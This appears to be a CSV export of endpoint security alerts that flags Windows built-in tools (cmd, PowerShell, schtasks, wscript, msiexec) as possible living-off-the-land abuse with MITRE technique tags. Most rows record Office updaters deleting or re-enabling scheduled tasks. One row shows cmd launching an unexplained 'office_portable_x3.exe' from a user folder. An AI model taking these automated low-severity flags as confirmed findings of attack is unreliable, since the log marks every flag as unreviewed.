"Jun 1, 2026 @ 14:23:27.278",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"""C:\Windows\system32\cmd.exe"" /c ""C:\Users\DELL\office_portable_x3.exe""",LOLBin Abuse,25,Living-off-the-land binary: cmd.exe,,,,,,end,"24,236",T1059.003,Windows Command Shell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-F05E1ED1
"Jun 1, 2026 @ 14:23:23.175",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"1,948",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-1D49DA0B
"Jun 1, 2026 @ 14:23:22.923",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-Interactive,,overwrite,"7,884",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-A57CD02A
"Jun 1, 2026 @ 14:23:16.601",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive,,overwrite,"11,540",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-20240D6B
"Jun 1, 2026 @ 14:23:16.478",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"11,540",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-A3087282
"Jun 1, 2026 @ 14:23:16.475",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"11,540",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-70650351
"Jun 1, 2026 @ 14:23:16.458",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"11,540",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-03EDC294
"Jun 1, 2026 @ 14:23:15.843",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"11,540",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-6182B582
"Jun 1, 2026 @ 14:23:15.744",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"11,540",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-E0472F92
"Jun 1, 2026 @ 14:23:15.741",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"11,540",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-275A2ADE
"Jun 1, 2026 @ 14:23:15.321",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"10,492",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-1A58EEEF
"Jun 1, 2026 @ 14:23:15.305",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"10,492",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-A8B8256D
"Jun 1, 2026 @ 14:23:14.757",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"10,492",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-8DF417A9
"Jun 1, 2026 @ 14:23:14.654",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"10,492",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-081BD3EC
"Jun 1, 2026 @ 14:23:14.651",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"10,492",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-57669D98
"Jun 1, 2026 @ 14:23:14.253",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"33,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-04125BF5
"Jun 1, 2026 @ 14:23:14.250",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"33,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-0510F35D
"Jun 1, 2026 @ 14:23:14.234",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"33,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-116A2032
"Jun 1, 2026 @ 14:21:05.226",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"28,276",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-C5854538
"Jun 1, 2026 @ 14:21:05.147",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /change /tn ""Microsoft\Office\Office ClickToRun Service Monitor"" /enable",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,end,"11,596",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-2E0F5CCF
"Jun 1, 2026 @ 14:21:05.144",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"11,596",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-4966BFBD
"Jun 1, 2026 @ 14:23:14.583",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"10,492",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-4BD0BD93
"Jun 1, 2026 @ 14:23:14.576",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_ys45w0hl.cig.psm1,,creation,"10,492",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-E76E3BA9
"Jun 1, 2026 @ 14:23:14.571",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_1xa2qrrg.20m.ps1,,creation,"10,492",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-DBD45088
"Jun 1, 2026 @ 14:23:14.570",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"10,492",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-40AF39DD
"Jun 1, 2026 @ 14:23:14.568",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"10,492",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-72CA4EEC
"Jun 1, 2026 @ 14:24:02.674",C:\Windows\System32\wscript.exe,,,LOLBin Abuse,25,Living-off-the-land binary: wscript.exe,,,,,,load,"33,896",T1059.005,Visual Basic,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-C7D29042
"Jun 1, 2026 @ 14:24:02.664",C:\Windows\System32\wscript.exe,,,LOLBin Abuse,25,Living-off-the-land binary: wscript.exe,,,,,,load,"33,896",T1059.005,Visual Basic,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-F9EFD5DA
"Jun 1, 2026 @ 14:24:02.662",C:\Windows\System32\wscript.exe,,,LOLBin Abuse,25,Living-off-the-land binary: wscript.exe,,,,,,load,"33,896",T1059.005,Visual Basic,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-AA87ECA9
"Jun 1, 2026 @ 14:24:02.652",C:\Windows\System32\wscript.exe,,,LOLBin Abuse,25,Living-off-the-land binary: wscript.exe,,,,,,load,"33,896",T1059.005,Visual Basic,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-5D66969F
"Jun 1, 2026 @ 14:24:02.650",C:\Windows\System32\wscript.exe,,,LOLBin Abuse,25,Living-off-the-land binary: wscript.exe,,,,,,load,"33,896",T1059.005,Visual Basic,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-6C6A16E4
"Jun 1, 2026 @ 14:24:02.640",C:\Windows\System32\wscript.exe,,,LOLBin Abuse,25,Living-off-the-land binary: wscript.exe,,,,,,load,"33,896",T1059.005,Visual Basic,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-3DB717C8
"Jun 1, 2026 @ 14:24:02.371",C:\Windows\System32\wscript.exe,,,LOLBin Abuse,25,Living-off-the-land binary: wscript.exe,,,,,,load,"33,896",T1059.005,Visual Basic,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-B27A8364
"Jun 1, 2026 @ 14:24:02.346",C:\Windows\System32\wscript.exe,,,LOLBin Abuse,25,Living-off-the-land binary: wscript.exe,,,,,,load,"33,896",T1059.005,Visual Basic,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-FE2E5198
"Jun 1, 2026 @ 14:24:02.678",C:\Windows\System32\wscript.exe,,,LOLBin Abuse,25,Living-off-the-land binary: wscript.exe,,,,,,load,"33,896",T1059.005,Visual Basic,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-1E7B89F7
"Jun 1, 2026 @ 14:23:15.456",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive,,overwrite,"10,492",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-FB903E2A
"Jun 1, 2026 @ 14:23:15.325",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"10,492",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-012A247A
"Jun 1, 2026 @ 14:21:05.098",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /change /tn ""Microsoft\Office\Office ClickToRun Service Monitor"" /enable",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,start,"11,596",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-9CA88BAD
"Jun 1, 2026 @ 14:21:05.093",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /Delete /F /tn ""Microsoft\Office\Office ClickToRun Service Monitor""",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,end,"27,032",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-BD49F417
"Jun 1, 2026 @ 14:21:05.079",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"27,032",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-B5B20B63
"Jun 1, 2026 @ 14:21:04.987",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /Delete /F /tn ""Microsoft\Office\Office ClickToRun Service Monitor""",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,start,"27,032",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-9D0A74B2
"Jun 1, 2026 @ 14:21:06.264",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"26,680",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-E6B80EEF
"Jun 1, 2026 @ 14:21:06.097",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /change /tn ""Microsoft\Office\Office Automatic Updates 2.0"" /enable",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,end,"36,860",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-AE37DA87
"Jun 1, 2026 @ 14:21:05.952",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"36,860",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-DF39522A
"Jun 1, 2026 @ 14:21:05.685",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /change /tn ""Microsoft\Office\Office Automatic Updates 2.0"" /enable",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,start,"36,860",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-64247AE4
"Jun 1, 2026 @ 14:21:05.681",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /Delete /F /tn ""Microsoft\Office\Office Automatic Updates 2.0""",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,end,"20,616",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-495EDB80
"Jun 1, 2026 @ 14:21:05.666",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"20,616",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-8A88CAE3
"Jun 1, 2026 @ 14:21:05.598",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /Delete /F /tn ""Microsoft\Office\Office Automatic Updates 2.0""",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,start,"20,616",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-892E5916
"Jun 1, 2026 @ 14:21:05.589",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /change /tn ""Microsoft\Office\Office Automatic Updates"" /enable",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,end,"16,272",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-E0BD7F6B
"Jun 1, 2026 @ 14:21:05.585",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"16,272",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-E8B8F647
"Jun 1, 2026 @ 14:21:05.517",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /change /tn ""Microsoft\Office\Office Automatic Updates"" /enable",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,start,"16,272",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-A5F28C48
"Jun 1, 2026 @ 14:21:05.513",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /change /tn ""Microsoft\Office\Office ClickToRun Service Monitor"" /enable",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,end,"27,516",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-F2F00176
"Jun 1, 2026 @ 14:21:05.504",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"27,516",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-176B1A00
"Jun 1, 2026 @ 14:21:05.421",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /change /tn ""Microsoft\Office\Office ClickToRun Service Monitor"" /enable",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,start,"27,516",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-2EF393B6
"Jun 1, 2026 @ 14:23:14.563",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"10,492",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-207C6C84
"Jun 1, 2026 @ 14:23:14.559",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"10,492",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-2ACD26AB
"Jun 1, 2026 @ 14:23:14.519",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"10,492",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-143BB598
"Jun 1, 2026 @ 14:23:14.507",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"10,492",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-DAA653BF
"Jun 1, 2026 @ 14:23:14.505",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"10,492",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-88FE9375
"Jun 1, 2026 @ 14:23:14.501",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"10,492",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-BE87E188
"Jun 1, 2026 @ 14:23:14.484",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"10,492",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-01A159FE
"Jun 1, 2026 @ 14:23:14.380",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive,,overwrite,"33,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-D7B45350
"Jun 1, 2026 @ 14:21:17.522",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Delete /F /tn ""Microsoft\Office\Office Performance Monitor""",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,start,"32,916",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-A2C997D2
"Jun 1, 2026 @ 14:21:17.441",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"20,308",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-84FF4FBF
"Jun 1, 2026 @ 14:21:17.360",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Delete /F /tn ""Microsoft\Office\Office Feature Updates Logon""",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,end,"8,180",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-6F8510CB
"Jun 1, 2026 @ 14:21:17.352",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"8,180",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-BFE7A21C
"Jun 1, 2026 @ 14:21:17.315",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Delete /F /tn ""Microsoft\Office\Office Feature Updates Logon""",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,start,"8,180",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-536758F4
"Jun 1, 2026 @ 14:21:17.262",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"30,448",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-F4C2554C
"Jun 1, 2026 @ 14:21:17.165",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Delete /F /tn ""Microsoft\Office\Office Feature Updates""",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,end,"24,020",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-1376C19D
"Jun 1, 2026 @ 14:21:17.155",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"24,020",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-50B51E79
"Jun 1, 2026 @ 14:21:17.111",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Delete /F /tn ""Microsoft\Office\Office Feature Updates""",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,start,"24,020",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-D5986304
"Jun 1, 2026 @ 14:21:06.564",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /change /tn ""Microsoft\Office\Office Automatic Updates 2.0"" /enable",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,end,"10,908",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-9AB512AA
"Jun 1, 2026 @ 14:21:06.554",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"10,908",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-ED12F7C2
"Jun 1, 2026 @ 14:21:06.429",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /change /tn ""Microsoft\Office\Office Automatic Updates 2.0"" /enable",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,start,"10,908",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-C7D42911
"Jun 1, 2026 @ 14:21:18.067",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"22,372",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-812109CA
"Jun 1, 2026 @ 14:21:17.987",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Delete /F /tn ""Microsoft\Office\Office Startup Maintenance""",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,end,"7,800",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-86D42D67
"Jun 1, 2026 @ 14:21:17.980",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"7,800",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-20CC185D
"Jun 1, 2026 @ 14:21:17.943",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Delete /F /tn ""Microsoft\Office\Office Startup Maintenance""",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,start,"7,800",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-81EA480A
"Jun 1, 2026 @ 14:21:17.885",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"21,536",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-C06F697D
"Jun 1, 2026 @ 14:21:17.783",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Delete /F /tn ""Microsoft\Office\Office Actions Server""",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,end,"25,264",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-422AB0C0
"Jun 1, 2026 @ 14:21:17.776",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"25,264",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-F05FD18F
"Jun 1, 2026 @ 14:21:17.737",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Delete /F /tn ""Microsoft\Office\Office Actions Server""",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,start,"25,264",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-5012BB8A
"Jun 1, 2026 @ 14:21:17.677",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"22,780",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-4AC481C6
"Jun 1, 2026 @ 14:21:17.580",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Delete /F /tn ""Microsoft\Office\Office Performance Monitor""",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,end,"32,916",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-B852DBFF
"Jun 1, 2026 @ 14:21:17.570",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"32,916",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-3B0EC820
"Jun 1, 2026 @ 14:21:39.773",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Config.Msi\15bcee43.rbs,,overwrite,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-1FD18F6D
"Jun 1, 2026 @ 14:21:39.513",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Config.Msi\15bcee43.rbs,,creation,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-A8B01B85
"Jun 1, 2026 @ 14:21:39.506",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSIF0C3.tmp,,overwrite,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-A73C9FD8
